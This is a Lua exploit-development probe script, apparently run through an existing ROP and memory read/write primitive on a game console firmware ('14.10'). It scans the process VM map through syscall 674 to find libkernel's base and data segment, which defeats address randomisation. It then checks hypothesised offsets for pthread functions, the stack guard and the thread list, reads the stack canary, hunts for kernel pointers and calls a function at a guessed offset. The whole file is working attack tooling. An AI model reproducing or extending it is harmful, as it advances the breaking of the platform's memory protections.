-- CRASH_CLASS: LOW
-- PROBE 589: Find libkernel base via fn_addr + sys 674 VM map, then drain lk_ offsets
--
-- dynlib_get_info(593) doesn't return libkernel for any handle 0-50.
-- But fn_addr (syscall.pipe.fn_addr) IS a libkernel code pointer.
-- Strategy: use sys 674 VM map to find the region containing fn_addr,
-- then compute lk_base = region_start and verify all lk_ hypothesis offsets.

print("=== PROBE 589: FIND LIBKERNEL + DRAIN LK ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function rb(buf, off)
    local addr = N(buf) + (off - off % 4)
    local dw = rd(addr)
    if not dw then return 0 end
    local shift = (off % 4) * 8
    return math.floor(dw / (2 ^ shift)) % 256
end
local function to_num64(h, l)
    return h * 0x100000000 + l
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

-- ============================================================
-- SECTION A: Print fn_addr and ropchain addresses
-- ============================================================
print("")
print("--- A: LOADER ADDRESSES ---")
local pipe_str = tostring(syscall.pipe)
print("  pipe_tostring: " .. pipe_str)
print("  fn_addr = " .. fmt64(stub))

local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
if rop_str then print("  ropchain = " .. rop_str) end

-- ============================================================
-- SECTION B: Scan sys 674 VM map to find fn_addr's region
-- ============================================================
print("")
print("--- B: VM MAP SCAN FOR FN_ADDR ---")

local sc674 = mk(674)
local STRIDE = 72
local MAX_RECORDS = 400
local buf = memory.alloc(STRIDE * MAX_RECORDS + 0x100)
local countp = memory.alloc(16)
wd(N(countp), 0)
wd(N(countp) + 4, 0)

local ok674, ret674 = pcall(function()
    return sc674(uint64(N(buf)), uint64(STRIDE), uint64(MAX_RECORDS),
                  uint64(N(countp)), uint64(0x40000000))
end)

if not ok674 then
    print("  674 FAILED: " .. tostring(ret674))
else
    local nregions = rd(N(countp)) or 0
    print("  674 ret=" .. N(ret674) .. " regions=" .. nregions)

    local fn_h, fn_l = get_hi_lo(stub)
    local fn_num = to_num64(fn_h, fn_l)
    print("  fn_addr numeric = " .. fmt64(stub))

    local ENTRY_SIZE = STRIDE
    local lk_base = nil
    local lk_end = nil
    local lk_name = nil
    local lk_prot = nil

    -- Also collect all executable regions for reference
    local exec_regions = {}

    for i = 0, math.min(nregions - 1, 500) do
        local base = N(buf) + i * ENTRY_SIZE

        local slo = rd(base + 0x00) or 0
        local shi = rd(base + 0x04) or 0
        if slo < 0 then slo = slo + 0x100000000 end
        if shi < 0 then shi = shi + 0x100000000 end

        local elo = rd(base + 0x08) or 0
        local ehi = rd(base + 0x0C) or 0
        if elo < 0 then elo = elo + 0x100000000 end
        if ehi < 0 then ehi = ehi + 0x100000000 end

        local prot = rd(base + 0x18) or 0

        local start_num = to_num64(shi, slo)
        local end_num = to_num64(ehi, elo)

        -- Read region name at +0x20
        local name_bytes = {}
        for j = 0, 31 do
            local b = rb(buf, i * ENTRY_SIZE + 0x20 + j)
            if b == 0 then break end
            name_bytes[#name_bytes + 1] = string.char(b)
        end
        local rname = table.concat(name_bytes)

        -- Check if fn_addr is in this region
        if fn_num >= start_num and fn_num < end_num then
            lk_base = start_num
            lk_end = end_num
            lk_name = rname
            lk_prot = prot
            print(string.format("  FOUND fn_addr in region %d: %s", i, rname))
            print(string.format("    start=0x%X end=0x%X prot=%d size=0x%X",
                start_num, end_num, prot, end_num - start_num))
            print(string.format("    fn_addr offset from start = 0x%X", fn_num - start_num))
        end

        -- Track executable-looking regions (p=4 XO or p=5 RX)
        if prot == 4 or prot == 5 then
            exec_regions[#exec_regions + 1] = {
                start = start_num, eend = end_num, prot = prot, name = rname
            }
        end
    end

    if not lk_base then
        print("  WARNING: fn_addr not found in any 674 region!")
        print("  Dumping all executable regions:")
        for _, r in ipairs(exec_regions) do
            print(string.format("    0x%X-0x%X p=%d %s", r.start, r.eend, r.prot, r.name))
        end
    end

    -- ============================================================
    -- SECTION C: With libkernel base, verify lk_ offsets
    -- ============================================================
    print("")
    print("--- C: LIBKERNEL OFFSET DRAIN ---")

    if lk_base then
        local lk_size = lk_end - lk_base
        print(string.format("  lk_base = 0x%X", lk_base))
        print(string.format("  lk_text_size = 0x%X", lk_size))
        print(string.format("  lk_text_prot = %d", lk_prot))

        -- Find data segment: next region after text with same name prefix and prot=3
        local found_text = false
        local lk_dbase = nil
        local lk_dsize = nil
        for i = 0, math.min(nregions - 1, 500) do
            local base_addr = N(buf) + i * ENTRY_SIZE
            local slo = rd(base_addr + 0x00) or 0
            local shi = rd(base_addr + 0x04) or 0
            if slo < 0 then slo = slo + 0x100000000 end
            if shi < 0 then shi = shi + 0x100000000 end
            local elo = rd(base_addr + 0x08) or 0
            local ehi = rd(base_addr + 0x0C) or 0
            if elo < 0 then elo = elo + 0x100000000 end
            if ehi < 0 then ehi = ehi + 0x100000000 end
            local prot = rd(base_addr + 0x18) or 0
            local s = to_num64(shi, slo)
            local e = to_num64(ehi, elo)

            if s == lk_base then found_text = true end

            -- Data segment: after our text, has name containing "libkernel" or same prefix, prot=3
            if found_text and s >= lk_end and prot == 3 then
                local name_bytes2 = {}
                for j = 0, 31 do
                    local b = rb(buf, i * ENTRY_SIZE + 0x20 + j)
                    if b == 0 then break end
                    name_bytes2[#name_bytes2 + 1] = string.char(b)
                end
                local rn = table.concat(name_bytes2)
                if rn:lower():find("libkernel") or rn:lower():find(lk_name:sub(1, 10):lower()) or s < lk_end + 0x100000 then
                    lk_dbase = s
                    lk_dsize = e - s
                    print(string.format("  lk_data_base = 0x%X (size=0x%X, prot=%d, name=%s)", s, e - s, prot, rn))
                    break
                end
            end
        end

        if not lk_dbase then
            -- Try next prot=3 region after text, regardless of name
            for i = 0, math.min(nregions - 1, 500) do
                local base_addr = N(buf) + i * ENTRY_SIZE
                local slo = rd(base_addr + 0x00) or 0
                local shi = rd(base_addr + 0x04) or 0
                if slo < 0 then slo = slo + 0x100000000 end
                if shi < 0 then shi = shi + 0x100000000 end
                local elo = rd(base_addr + 0x08) or 0
                local ehi = rd(base_addr + 0x0C) or 0
                if elo < 0 then elo = elo + 0x100000000 end
                if ehi < 0 then ehi = ehi + 0x100000000 end
                local prot = rd(base_addr + 0x18) or 0
                local s = to_num64(shi, slo)
                local e = to_num64(ehi, elo)

                if s > lk_end and s < lk_end + 0x200000 and prot == 3 then
                    lk_dbase = s
                    lk_dsize = e - s
                    local name_bytes3 = {}
                    for j = 0, 31 do
                        local b = rb(buf, i * ENTRY_SIZE + 0x20 + j)
                        if b == 0 then break end
                        name_bytes3[#name_bytes3 + 1] = string.char(b)
                    end
                    print(string.format("  lk_data_base = 0x%X (size=0x%X, prot=%d, name=%s) [fallback]",
                        s, e - s, prot, table.concat(name_bytes3)))
                    break
                end
            end
        end

        -- Now verify each offset
        local HYPO_LK = {
            {name="sceKernelGetCurrentCpu", offset=0x1200,  type="code"},
            {name="worker_wait_return",     offset=0x1FD01, type="code"},
            {name="pthread_create_name_np", offset=0x21890, type="code"},
            {name="pthread_join",           offset=0x229A0, type="code"},
            {name="pthread_exit",           offset=0x21C20, type="code"},
            {name="sleep",                  offset=0x27F00, type="code"},
            {name="__stack_chk_guard",      offset=0x751D0, type="data"},
            {name="_thread_list",           offset=0x6C218, type="data"},
        }

        local data_offset = lk_dbase and (lk_dbase - lk_base) or nil
        if data_offset then
            print(string.format("  data_segment_offset = 0x%X", data_offset))
        end

        for _, h in ipairs(HYPO_LK) do
            local target_num = lk_base + h.offset
            local in_text = (h.offset < lk_size)
            local in_data = false
            if data_offset and lk_dsize then
                in_data = (h.offset >= data_offset and h.offset < data_offset + lk_dsize)
            end

            local segment = "UNMAPPED"
            if in_text then segment = "TEXT" end
            if in_data then segment = "DATA" end

            -- For code offsets: in_text and prot=4 means XO (unreadable), prot=5 means RX
            local readable = false
            if in_data then readable = true end
            if in_text and lk_prot == 5 then readable = true end

            print(string.format("  %s: off=0x%X addr=0x%X seg=%s type=%s",
                h.name, h.offset, target_num, segment, h.type))

            if h.type == "data" and in_data and readable then
                local val = rq(uint64(string.format("0x%X", target_num)))
                if val then
                    print(string.format("    DATA_READ value=%s", fmt64(val)))
                    local vh, vl = get_hi_lo(val)
                    if vh >= 0xFFFF8000 then
                        print("    *** KERNEL POINTER ***")
                    end
                else
                    print("    DATA_READ_FAIL")
                end
            elseif h.type == "data" and in_text then
                if lk_prot == 5 then
                    local val = rq(uint64(string.format("0x%X", target_num)))
                    if val then
                        print(string.format("    TEXT_READ value=%s (RX segment)", fmt64(val)))
                    else
                        print("    TEXT_READ_FAIL")
                    end
                else
                    print("    SKIP (XO text, would kill)")
                end
            end
        end

        -- ============================================================
        -- SECTION D: Test sceKernelGetCurrentCpu
        -- ============================================================
        print("")
        print("--- D: FUNCTION CALL TEST ---")

        local cpu_addr = uint64(string.format("0x%X", lk_base + 0x1200))
        print("  target = " .. fmt64(cpu_addr) .. " (lk_base+0x1200)")

        if lk_prot == 5 then
            -- RX segment, safe to read first bytes
            local first_dw = rd(lk_base + 0x1200)
            if first_dw then
                print(string.format("  first dword at offset: 0x%08X", first_dw))
            end
        end

        local ok_call, ret_call = pcall(function()
            return native.fcall_with_rax(cpu_addr, 0)
        end)
        if ok_call then
            local rv = N(ret_call)
            print(string.format("  result: %d (0x%X)", rv, rv))
            if rv >= 0 and rv <= 7 then
                print("  VERDICT: sceKernelGetCurrentCpu at +0x1200 LIVE on 14.10")
            else
                print("  VERDICT: returned " .. rv .. ", offset likely WRONG")
            end
        else
            print("  CALL FAILED: " .. tostring(ret_call))
            print("  VERDICT: offset 0x1200 likely WRONG or crashes")
        end

        -- Also test fn_addr offset to characterize it
        print("")
        print("  fn_addr offset in libkernel = 0x" .. string.format("%X", fn_num - lk_base))

    else
        print("  Cannot proceed without libkernel base")
    end
end

-- ============================================================
-- SECTION E: Canary
-- ============================================================
print("")
local ok_canary = N(native.fcall_with_rax(stub, 20)) == pid
print("canary=" .. tostring(ok_canary))
print("=== PROBE 589 COMPLETE ===")
